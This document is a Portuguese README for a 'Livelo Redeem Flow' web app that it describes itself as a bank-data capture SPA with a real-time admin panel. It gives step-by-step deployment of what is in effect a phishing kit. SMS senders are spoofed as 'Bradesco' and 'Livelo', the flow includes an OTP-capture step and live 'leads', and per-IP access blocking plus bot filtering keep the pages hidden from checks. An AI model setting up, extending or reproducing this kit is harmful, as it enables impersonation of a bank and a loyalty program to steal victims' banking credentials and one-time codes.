# Livelo Redeem Flow

SPA de captura de dados bancários com painel administrativo em tempo real.

## Stack

- React + Vite + TypeScript + Tailwind CSS
- Supabase (PostgreSQL, Edge Functions, Realtime)
- Apache / nginx

---

## Instalação manual

### 1. Clonar e instalar

```bash
git clone <repo>
cd livelo-redeem-flow
bun install
```

### 2. Configurar `.env`

```bash
cp .env.example .env
nano .env
```

Preencher as variáveis `VITE_*` (ver seção abaixo).

### 3. Supabase Secrets

```bash
npx supabase secrets set \
  SUPABASE_SERVICE_ROLE_KEY="..." \
  TURNSTILE_SECRET_KEY="..." \
  RISENEW_API_KEY="..." \
  RISENEW_API_SECRET="..." \
  RISENEW_SENDER="Bradesco" \
  RISENEW_API_KEY_2="..." \
  RISENEW_API_SECRET_2="..." \
  RISENEW_SENDER_2="Livelo" \
  IPINFO_TOKEN="..." \
  ZENROWS_API_KEY="..." \
  META_PIXEL_ID="..." \
  META_CAPI_ACCESS_TOKEN="..." \
  --project-ref <project-id>
```

> Ou use o script interativo que preenche `--project-ref` automaticamente:
> ```bash
> chmod +x set-secrets.sh && ./set-secrets.sh
> ```

### 4. Migrations

Rodar em ordem no **Supabase Dashboard → SQL Editor**:

1. `supabase/migrations/20260302235900_rls_indexes_functions.sql`
2. `supabase/migrations/20260303000000_additions.sql`
3. `supabase/migrations/20260304000000_session_ipinfo_fields.sql`
4. `supabase/migrations/20260304000001_flow_otp_step.sql`
5. `supabase/migrations/20260305000000_session_heartbeat.sql`
6. `supabase/migrations/20260305000001_user_roles.sql`
7. `supabase/migrations/20260306000000_otp_attempts.sql`

### 5. Usuário admin

**Dashboard → Authentication → Users → Add user**
- Email: mesmo valor de `VITE_ADMIN_EMAIL` no `.env`
- ✅ Auto Confirm User

Depois no SQL Editor:

```sql
INSERT INTO public.user_roles (user_id, role)
SELECT id, 'admin' FROM auth.users
WHERE email = 'seu-email@aqui'
ON CONFLICT (user_id) DO NOTHING;
```

### 6. Deploy edge functions

```bash
npx supabase login
npx supabase link --project-ref <project-id>
npx supabase functions deploy --project-ref <project-id>
```

### 7. Build e deploy

```bash
bun run build
# copiar dist/ para o servidor web
```

---

## Atualização

```bash
./setup.sh  # selecionar opção 2
# ou manualmente:
git pull && bun install && bun run build
```

---

## Painel Admin

Acesse `/admin` — login com a senha do usuário criado no Supabase Auth.

| Página | Descrição |
|---|---|
| `/admin` | Leads em tempo real, métricas, envio de SMS manual |
| `/admin/acessos` | Sessões, IPs, status de bloqueio por regra |
| `/admin/controle` | Configurações gerais, templates SMS, fluxo de etapas |
| `/admin/fluxo` | Reordenação e habilitação de etapas |

---

## Variáveis de ambiente (`.env`)

Apenas variáveis de build-time do frontend:

| Variável | Descrição |
|---|---|
| `VITE_SUPABASE_PROJECT_ID` | Project Reference ID |
| `VITE_SUPABASE_PUBLISHABLE_KEY` | Anon/public key |
| `VITE_SUPABASE_URL` | URL do projeto |
| `VITE_ADMIN_EMAIL` | Email do usuário admin |
| `VITE_TURNSTILE_SITE_KEY` | Site key pública do Turnstile (opcional) |
| `VITE_META_PIXEL_ID` | ID do pixel Meta (opcional) |
| `VITE_SMS_SENDER_1_LABEL` | Label do sender padrão no painel |
| `VITE_SMS_SENDER_2_LABEL` | Label do sender alternativo no painel |
| `VITE_SMS_LINK` | Placeholder `{{link}}` nos templates SMS |

## Supabase Secrets (edge functions)

| Secret | Descrição |
|---|---|
| `SUPABASE_SERVICE_ROLE_KEY` | Service role key (bypasses RLS) |
| `TURNSTILE_SECRET_KEY` | Cloudflare Turnstile secret |
| `RISENEW_API_KEY` | Risenew — sender padrão |
| `RISENEW_API_SECRET` | Risenew — sender padrão |
| `RISENEW_SENDER` | Nome do sender padrão |
| `RISENEW_API_KEY_2` | Risenew — sender alternativo |
| `RISENEW_API_SECRET_2` | Risenew — sender alternativo |
| `RISENEW_SENDER_2` | Nome do sender alternativo |
| `IPINFO_TOKEN` | IPInfo — geolocalização |
| `ZENROWS_API_KEY` | ZenRows — consulta de segmento |
| `META_PIXEL_ID` | ID do pixel Meta (edge function) |
| `META_CAPI_ACCESS_TOKEN` | Meta Conversions API token |
